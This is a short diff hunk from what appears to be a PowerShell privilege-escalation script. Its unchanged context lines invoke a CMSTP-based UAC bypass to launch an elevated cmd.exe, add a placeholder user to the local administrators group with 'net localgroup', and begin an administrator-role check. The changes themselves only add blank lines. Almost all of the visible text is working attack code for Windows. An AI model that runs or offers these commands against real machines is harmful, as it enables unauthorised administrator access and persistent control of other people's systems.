@@ -17,8 +17,10 @@ Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -Reference
 
 # Start elevated cmd
 [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+
 # Add user to group
 net localgroup administrators {userhere} /add
+
 # Powershell Elevated 
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
